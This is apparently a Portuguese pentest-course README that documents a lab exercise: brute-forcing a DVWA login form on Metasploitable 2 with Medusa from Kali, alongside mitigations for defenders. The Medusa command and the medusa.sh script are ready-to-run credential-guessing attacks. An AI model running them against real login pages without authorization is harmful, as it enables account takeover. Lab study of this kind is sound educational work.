# Brute Force com Medusa no Kali Linux

> **Nota ética:** Este material descreve exercícios realizados em ambiente controlado e autorizado. **Não** utilize essas técnicas contra sistemas que você não tenha permissão para testar.

Olá — este README registra de forma direta e prática o trabalho que realizei no curso de **Penetração (Pentest)** usando ataques de **brute force** com **Medusa** em um laboratório local. Use como referência de estudo, sempre em ambientes autorizados.

---

## Ambiente de teste

* **VM atacante:** Kali Linux
* **VM alvo:** Metasploitable 2
* **Hypervisor:** VirtualBox
* **Tipo de rede:** Host-only (rede isolada entre VMs)

> Recomendo fortemente esse setup para aprender com segurança.

---

## O que contém este repositório

* `README.md` (este arquivo)
* `medusa.sh` (script de exemplo)
* `users.txt` (exemplo de wordlist de usuários — use entradas de teste)
* `pass.txt` (exemplo de wordlist de senhas — use entradas de teste)

---

## Ferramentas utilizadas

* **Medusa** — brute-force em paralelo (SSH, FTP, HTTP, etc.).
* **Kali Linux** — máquina atacante.
* **Metasploitable 2** — alvo intencionalmente vulnerável.
* **VirtualBox** — execução das VMs em rede Host-only.
* Utilitários: `dos2unix`, `bash`, `ssh`, `scp`.

---

## Preparando o ambiente (resumo dos passos)

1. Crie duas VMs no VirtualBox: Kali Linux e Metasploitable 2.
2. Configure a rede como **Host-only** para manter as VMs isoladas.
3. Ligue as VMs e descubra o IP do alvo (ex.: `192.168.56.101`).
4. No Kali, instale o Medusa se não estiver presente:

```bash
sudo apt update
sudo apt install -y medusa
```

5. Crie `users.txt` e `pass.txt` com uma entrada por linha.

---

## Exemplo de execução (brute force HTTP contra formulário)

Antes de rodar, confirme o caminho do formulário e o nome dos campos (ex.: `username`, `password`).

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:/dvwa/login.php \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

* `-h` : IP do alvo
* `-U` : arquivo com usuários
* `-P` : arquivo com senhas
* `-M` : módulo (aqui `http`)
* `-m PAGE:` : página do formulário
* `-m FORM:` : payload do formulário usando `^USER^` e `^PASS^`
* `-m 'FAIL='` : string que indica tentativa falhada
* `-t` : número de threads

Interrompa com `Ctrl+C` quando precisar.

---

## Script pronto (`medusa.sh`)

Arquivo exemplo — ajuste IP e caminhos antes de usar.

```bash
#!/bin/bash
# medusa.sh - Exemplo para ambiente de teste
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
  -m PAGE:/dvwa/login.php \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m 'FAIL=Login failed' -t 6
```

Dê permissão de execução:

```bash
chmod +x medusa.sh
./medusa.sh
```

---

## Como interpretar os resultados

* O Medusa mostra combinações válidas no terminal.
* Se não encontrar nada, verifique:

  * Se as listas contêm as credenciais certas;
  * Se os nomes dos campos/form estão corretos (`email` vs `username`);
  * Se há proteção no servidor (bloqueio, rate-limit, CAPTCHA).

Registre horário, IP, listas usadas e saída do Medusa para auditoria.

---

## Aprendizados práticos (direto ao ponto)

* Laboratório isolado é obrigatório para aprendizado seguro.
* Qualidade das wordlists é crucial.
* Ajustes finos em `FORM`, `PAGE` e `FAIL` são necessários para web.
* Controles simples no servidor (bloqueio, MFA, CAPTCHA) limitam brute force.
* Documentar tudo aumenta rastreabilidade.

---

## Boas práticas e mitigação (para defensores)

* Bloqueio de conta temporário após várias tentativas falhas.
* Autenticação multifator (MFA).
* Monitoramento de logs e detecção de padrões de ataques automatizados.
* Rate limiting e CAPTCHAs quando aplicável.

---

## Publicação no GitHub

1. Crie um repositório (recomendo `private` se houver qualquer dado sensível).
2. Adicione `README.md`, `medusa.sh`, `users.txt` e `pass.txt` **somente** com exemplos inofensivos.
3. Inclua `LICENSE` (ex.: MIT) e um `DISCLAIMER` sobre uso ético/educacional.

---

## Aviso legal e ético

Este material é educativo. Não use técnicas aqui descritas contra sistemas sem autorização.

---

## Autor

Mateus Dias Moreira

---

Se quiser que eu também crie o arquivo `medusa.sh` pronto para download, me avisa que eu gero ele aqui no repositório.

